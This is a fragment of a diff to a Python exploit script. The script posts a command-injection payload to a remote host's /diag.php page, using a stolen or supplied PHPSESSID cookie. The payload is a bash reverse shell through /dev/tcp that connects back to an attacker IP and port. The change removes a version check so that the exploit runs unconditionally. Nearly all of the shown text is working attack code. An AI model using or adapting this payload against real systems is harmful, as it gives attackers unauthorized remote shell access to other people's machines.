@@ -29,5 +29,4 @@ def exploit():
 		r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=ip,port=port))},cookies={'PHPSESSID':cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
 
 if __name__ == '__main__':
-	checkVersion()
 	exploit()
